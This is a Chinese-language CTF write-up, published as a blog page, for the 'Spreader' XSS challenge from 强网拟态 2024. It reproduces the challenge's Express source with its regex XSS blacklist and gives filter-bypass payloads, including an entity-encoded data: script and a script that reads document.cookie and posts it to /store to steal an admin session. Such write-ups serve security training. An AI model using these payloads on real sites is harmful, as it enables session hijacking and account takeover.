@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="分析与尝试(ALMOST DONE) 代码分析  考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS 看一下代码，将用户存在users列表里，密码明文存储 访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容 访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spreader_强网拟态24">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="分析与尝试(ALMOST DONE) 代码分析  考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS 看一下代码，将用户存在users列表里，密码明文存储 访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容 访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-04T04:58:56.288Z">
+<meta property="article:modified_time" content="2024-11-04T12:33:08.829Z">
+<meta property="article:tag" content="recurrence">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spreader_强网拟态24</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&text=Spreader_强网拟态24"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&is_video=false&description=Spreader_强网拟态24"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spreader_强网拟态24&body=Check out this article: https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&title=Spreader_强网拟态24"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&name=Spreader_强网拟态24&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/&t=Spreader_强网拟态24"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%8E%E5%B0%9D%E8%AF%95-ALMOST-DONE"><span class="toc-number">1.</span> <span class="toc-text">分析与尝试(ALMOST DONE)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-and-payload"><span class="toc-number">2.</span> <span class="toc-text">***bypass and payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">源码</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spreader_强网拟态24
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-04T04:58:56.288Z" class="dt-published" itemprop="datePublished">2024-11-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>, <a class="p-category" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="分析与尝试-ALMOST-DONE"><a href="#分析与尝试-ALMOST-DONE" class="headerlink" title="分析与尝试(ALMOST DONE)"></a>分析与尝试(ALMOST DONE)</h2><ol>
+<li><p>代码分析</p>
+<ol>
+<li>考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS</li>
+<li>看一下代码，将用户存在users列表里，密码明文存储</li>
+<li>访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容</li>
+<li>访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和admin的文章</li>
+<li>任何人都可以获取&#x2F;store的内容，存的是req.body</li>
+<li>显然要读&#x2F;flag内容</li>
+</ol>
+</li>
+<li><p>不是哥们，如果我先做过这题网鼎直接秒了啊，真实艹了，现在轮到我秒你了，还是假装一下</p>
+</li>
+<li><p>目标，通过admin读到flag，然后写在post里或者&#x2F;store回来？也可以是直接带外如果开网的话，通过&#x2F;report_admin让admin来看</p>
+<ol>
+<li><em><strong>attacks(可以的，没有问题)</strong></em>: 普通用户写内容，&#x2F;report_previleged读让&#x2F;report_admin触发admin访问&#x2F;flag读取内容后访问&#x2F;store写入，然后使用本地用户登录并访问&#x2F;store即可</li>
+<li>现在的问题在于<strong>绕过</strong>：检测大小写与全局，特殊函数<code>eval(</code>需要左括号才会被过滤，允许使用href和src但是不能加上恶意东西<ol>
+<li>想到base64编码但是被过滤了，php伪协议+其他编码？source被过滤了</li>
+<li>刚好<code>window[&#39;eval&#39;](atob(data))</code>可以行得通，可打，怎么调用到js –&gt; <em><strong>还是看题解了，不要浪费太多实践</strong></em></li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缺点：需要herf点击，这里行不通</span></span><br><span class="line"><span class="comment">// 返回javascript:后面就是可读内容</span></span><br><span class="line"><span class="comment">// javascript:在herf里才可以，img行不通</span></span><br><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;<span class="variable language_">window</span>[<span class="string">&#x27;eval&#x27;</span>](<span class="title function_">atob</span>(data)) <span class="comment">// 在data中输入base64编码的值</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="bypass-and-payload"><a href="#bypass-and-payload" class="headerlink" title="***bypass and payload"></a>***bypass and payload</h2><ol>
+<li><p>bypass: 这里使用了<em><strong>html自动闭合</strong></em>的特性调用js，使用<em><strong>实体编码</strong></em>来绕过关键词</p>
+<ol>
+<li>这里如果使用python发包的话，可以抓包看看是x-www-urlencoded或者是application&#x2F;json</li>
+</ol>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc 成功调用alert() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span>&lt;/script</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>paylaod</p>
+<ol>
+<li><p>打cookie写法，标签未闭合绕过</p>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取previlegedcookie</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script</span><br><span class="line"><span class="comment">// 2. 不出网，上传后/report_privileged写入&#x27;/store&#x27;带出cookie</span></span><br><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/store&#x27;</span>,&#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,<span class="attr">body</span>:<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&#125;);&lt;/script</span><br><span class="line"><span class="comment">// 3. 登录previleged，同理上传后/report_privileged</span></span><br><span class="line"><span class="comment">// 4. 获取cookie访问/flag</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写入载体法略，总之js写一下在键值中再写一次就好</p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; triggerXSS &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Store</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAuthenticated</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROLES</span> = &#123;</span><br><span class="line">        <span class="attr">PLAIN</span>: <span class="string">&quot;plain&quot;</span>,</span><br><span class="line">        <span class="attr">PRIVILEGED</span>: <span class="string">&quot;privileged&quot;</span>,</span><br><span class="line">        <span class="attr">ADMIN</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;register.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password, role &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userExists = users.<span class="title function_">some</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Username already exists!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;login.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">        <span class="keyword">const</span> user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">        <span class="keyword">if</span> (user) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentUser = req.<span class="property">session</span>.<span class="property">user</span>;</span><br><span class="line">        <span class="keyword">let</span> filteredPosts = [];</span><br><span class="line">        <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class="attr">posts</span>: filteredPosts, <span class="attr">user</span>: currentUser &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> scriptTagRegex = <span class="regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(scriptTagRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> eventHandlerRegex = <span class="regexp">/on\w+\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(eventHandlerRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> javascriptURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*javascript:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(javascriptURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dataURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*data:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dataURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cssExpressionRegex = <span class="regexp">/style\s*=\s*([&quot;&#x27;]).*?expression\([^&gt;]*?\).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(cssExpressionRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousTagsRegex = <span class="regexp">/&lt;\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousTagsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousAttributesRegex = <span class="regexp">/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousAttributesRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousProtocolsRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousProtocolsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousFunctionsRegex = <span class="regexp">/\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousFunctionsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        posts.<span class="title function_">push</span>(&#123; <span class="attr">content</span>: content, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">role</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_admin&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;admin&quot;</span>,<span class="title class_">AdminPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        